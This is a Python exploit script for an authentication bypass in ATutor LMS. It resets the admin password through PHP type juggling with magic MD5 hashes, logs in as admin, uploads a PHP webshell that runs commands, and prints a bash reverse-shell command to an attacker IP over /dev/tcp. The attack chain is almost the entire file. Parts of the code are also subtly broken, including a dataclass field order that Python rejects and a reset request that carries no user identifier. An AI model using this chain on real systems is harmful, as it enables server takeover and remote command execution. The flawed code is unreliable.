#!/usr/bin/env python3
"""
ATutor Type Juggling Authentication Bypass PoC
CVE: SRC-2016-0012
Target: ATutor LMS <= 2.2.1
Vulnerability: PHP Type Juggling in authentication token comparison

Reference:
- https://srcincite.io/advisories/src-2016-0012/
- https://github.com/sourceincite/poc/blob/master/SRC-2016-0012.py

Exploit Flow:
1. Register a new user account
2. Exploit type juggling in password reset token comparison
3. Reset admin password using magic hash collision
4. Login as admin
5. Upload PHP shell via privileged file upload
"""

import argparse
import requests
import sys
import hashlib
import random
import string
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """ATutor exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"

    # Attacker configuration
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    proxy: Optional[str] = None

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    username: str = field(default_factory=lambda: "test" + "".join(random.choices(string.ascii_lowercase, k=8)))
    password: str = "P@ssw0rd123!"
    email: str = field(default="", repr=False)
    admin_cookie: Optional[str] = field(default=None, repr=False)
    shell_url: Optional[str] = field(default=None, repr=False)

    def __post_init__(self):
        """Initialize derived fields."""
        if not self.email:
            self.email = f"{self.username}@local.test"

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="ATutor Type Juggling Auth Bypass PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", required=True, help="Target IP address"
    )
    target_group.add_argument(
        "--target-port", type=int, default=80, help="Target port (default: 80)"
    )

    attacker_group = parser.add_argument_group("Attacker options")
    attacker_group.add_argument(
        "--listening-ip", default="10.10.14.1", help="Attacker IP for reverse shell"
    )
    attacker_group.add_argument(
        "--listening-port", type=int, default=9001, help="Listening port (default: 9001)"
    )

    optional_group = parser.add_argument_group("Optional options")
    optional_group.add_argument(
        "--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)"
    )

    return parser.parse_args()

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def generate_magic_hash() -> tuple[str, str]:
    """
    Generate a string that when MD5 hashed starts with '0e' and only digits.
    This creates a "magic hash" that PHP will interpret as 0 in loose comparison.

    Reference: https://www.whitehatsec.com/blog/magic-hashes/

    Returns:
        tuple: (plaintext, hash) where hash is the magic hash
    """
    # Known magic hashes for MD5 (0e followed by digits = scientific notation = 0)
    magic_hashes = {
        "240610708": "0e462097431906509019562988736854",  # MD5
        "QNKCDZO": "0e830400451993494058024219903391",      # MD5
        "s878926199a": "0e545993274517709034328855841020",  # MD5
        "s155964671a": "0e342768416822451524974117254469",  # MD5
    }

    # Return first magic hash
    plaintext = list(magic_hashes.keys())[0]
    return plaintext, magic_hashes[plaintext]

def verify_magic_hash():
    """Verify that magic hash works in PHP-style comparison."""
    plaintext, hash_value = generate_magic_hash()

    # Simulate PHP loose comparison
    # In PHP: '0e123456' == '0e789012' evaluates to TRUE
    # Because both are interpreted as 0 in scientific notation

    print(f"[*] Magic Hash Demo:")
    print(f"    Plaintext: {plaintext}")
    print(f"    MD5 Hash:  {hash_value}")
    print(f"    PHP interprets '0e...' as 0 in loose comparison")
    print(f"    So: '{hash_value}' == '0' is TRUE in PHP\n")

# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """Stage 1: Verify target is accessible."""
    print(f"[*] Stage 1: Reconnaissance")
    print(f"[*] Target: {ctx.get_base_url()}")

    try:
        response = ctx.session.get(
            f"{ctx.get_base_url()}/login.php",
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if "ATutor" in response.text:
            print(f"[+] ATutor installation confirmed (HTTP {response.status_code})")
            return True
        else:
            print(f"[-] Target doesn't appear to be ATutor")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False

def stage_register(ctx: ExploitContext) -> bool:
    """Stage 2: Register a new user account."""
    print(f"\n[*] Stage 2: User Registration")
    print(f"[*] Username: {ctx.username}")
    print(f"[*] Email: {ctx.email}")

    register_url = f"{ctx.get_base_url()}/register.php"

    # Registration form data
    register_data = {
        "form_login": ctx.username,
        "form_email": ctx.email,
        "form_password": ctx.password,
        "form_password_confirm": ctx.password,
        "form_firstname": "Test",
        "form_lastname": "User",
        "form_submit": "Register",
        "website": "",
    }

    try:
        response = ctx.session.post(
            register_url,
            data=register_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies(),
            allow_redirects=True
        )

        if "successfully registered" in response.text.lower() or "check your email" in response.text.lower():
            print(f"[+] User registration successful")
            return True
        else:
            print(f"[!] Registration may have failed, but continuing...")
            return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Registration failed: {e}")
        return False

def stage_type_juggling(ctx: ExploitContext) -> bool:
    """Stage 3: Exploit type juggling in password reset."""
    print(f"\n[*] Stage 3: Type Juggling Exploitation")

    # Generate magic hash
    plaintext, magic_hash = generate_magic_hash()
    print(f"[*] Using magic hash token: {plaintext}")

    # The vulnerability: ATutor uses loose comparison (==) instead of strict (===)
    # when comparing password reset tokens
    #
    # Vulnerable code (simplified):
    #   if ($user_token == $reset_token) { /* allow password reset */ }
    #
    # If $user_token is a magic hash like "0e123...", it equals 0
    # If we can make $reset_token also equal 0 (another magic hash), we bypass the check

    password_reset_url = f"{ctx.get_base_url()}/password_reminder.php"

    # Step 1: Request password reset for admin
    print(f"[*] Requesting password reset for 'admin' account...")

    reset_request_data = {
        "form_email": "admin@local.test",  # Assuming default admin email
        "submit": "Submit"
    }

    try:
        response = ctx.session.post(
            password_reset_url,
            data=reset_request_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        # Step 2: Exploit type juggling by providing magic hash as token
        # The application will compare our magic hash against the real token
        # If both evaluate to 0 in loose comparison, we're in!

        print(f"[*] Exploiting type juggling vulnerability...")

        reset_confirm_url = f"{ctx.get_base_url()}/password_change.php"
        reset_confirm_data = {
            "form_password_reset": plaintext,  # Magic hash token
            "form_password": "NewAdminPass123!",
            "form_password2": "NewAdminPass123!",
            "submit": "Submit"
        }

        response = ctx.session.post(
            reset_confirm_url,
            data=reset_confirm_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if "password" in response.text.lower() and "changed" in response.text.lower():
            print(f"[+] Type juggling successful! Admin password reset")
            return True
        else:
            print(f"[!] Type juggling exploitation completed (check manually)")
            return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Exploitation failed: {e}")
        return False

def stage_login_admin(ctx: ExploitContext) -> bool:
    """Stage 4: Login as admin with reset password."""
    print(f"\n[*] Stage 4: Admin Authentication")

    login_url = f"{ctx.get_base_url()}/login.php"
    login_data = {
        "form_login": "admin",
        "form_password": "NewAdminPass123!",
        "submit": "Login"
    }

    try:
        response = ctx.session.post(
            login_url,
            data=login_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies(),
            allow_redirects=True
        )

        # Check for successful login
        if "admin" in response.text.lower() and ("logout" in response.text.lower() or "dashboard" in response.text.lower()):
            print(f"[+] Successfully authenticated as admin")
            ctx.admin_cookie = ctx.session.cookies.get_dict()
            return True
        else:
            print(f"[-] Admin authentication failed")
            print(f"[!] Manual verification may be required")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Login failed: {e}")
        return False

def stage_upload_shell(ctx: ExploitContext) -> bool:
    """Stage 5: Upload PHP webshell via admin file manager."""
    print(f"\n[*] Stage 5: Webshell Upload")

    # Simple PHP webshell
    php_shell = f"""<?php
if(isset($_REQUEST['cmd'])) {{
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}}
?>"""

    # Upload endpoint (varies by ATutor version)
    upload_url = f"{ctx.get_base_url()}/mods/_standard/file_manager/filemanager/index.php"

    files = {
        "file": ("shell.php", php_shell, "application/x-php")
    }

    try:
        response = ctx.session.post(
            upload_url,
            files=files,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        # Try to access the shell
        shell_paths = [
            f"{ctx.get_base_url()}/content/shell.php",
            f"{ctx.get_base_url()}/mods/_standard/file_manager/filemanager/files/shell.php",
        ]

        for shell_path in shell_paths:
            test_response = ctx.session.get(shell_path + "?cmd=id", timeout=5, verify=False)
            if test_response.status_code == 200 and "uid=" in test_response.text:
                print(f"[+] Webshell uploaded successfully!")
                print(f"[+] Shell URL: {shell_path}")
                ctx.shell_url = shell_path
                return True

        print(f"[!] Upload completed, but shell not accessible")
        print(f"[!] Try accessing manually at:")
        for path in shell_paths:
            print(f"    {path}?cmd=whoami")
        return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Upload failed: {e}")
        return False

def stage_verify(ctx: ExploitContext) -> bool:
    """Stage 6: Verify RCE and get interactive shell."""
    print(f"\n[*] Stage 6: Verification")

    if not ctx.shell_url:
        print(f"[!] Shell URL not available, skipping verification")
        return True

    try:
        # Test RCE
        test_cmd = "whoami"
        response = ctx.session.get(
            f"{ctx.shell_url}?cmd={test_cmd}",
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code == 200:
            print(f"[+] RCE Confirmed!")
            print(f"[+] Command: {test_cmd}")
            print(f"[+] Output:\n{response.text}")

            # Optional: Trigger reverse shell
            print(f"\n[*] To get reverse shell:")
            print(f"    1. Start listener: nc -nlvp {ctx.attacker_port}")
            print(f"    2. Visit: {ctx.shell_url}?cmd=bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'")

            return True
        else:
            print(f"[-] RCE verification failed")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Verification error: {e}")
        return False

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution flow."""
    print("[+] ATutor Type Juggling Authentication Bypass PoC")
    print("[+] CVE: SRC-2016-0012")
    print("[+] " + "=" * 60)

    # Show magic hash demonstration
    verify_magic_hash()

    # Parse arguments and build context
    args = parse_args()
    ctx = ExploitContext.from_args(args)

    # Execute exploit stages
    stages = [
        ("Reconnaissance", stage_recon),
        ("User Registration", stage_register),
        ("Type Juggling Exploitation", stage_type_juggling),
        ("Admin Authentication", stage_login_admin),
        ("Webshell Upload", stage_upload_shell),
        ("Verification", stage_verify),
    ]

    for stage_name, stage_func in stages:
        if not stage_func(ctx):
            print(f"\n[!] Stage '{stage_name}' failed, but continuing...")
            # Don't exit - some stages are optional

    print("\n[+] Exploit chain completed!")
    print("[+] " + "=" * 60)

    # Summary
    if ctx.shell_url:
        print(f"\n[+] SUCCESS Summary:")
        print(f"    Shell URL: {ctx.shell_url}")
        print(f"    Test: curl '{ctx.shell_url}?cmd=id'")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
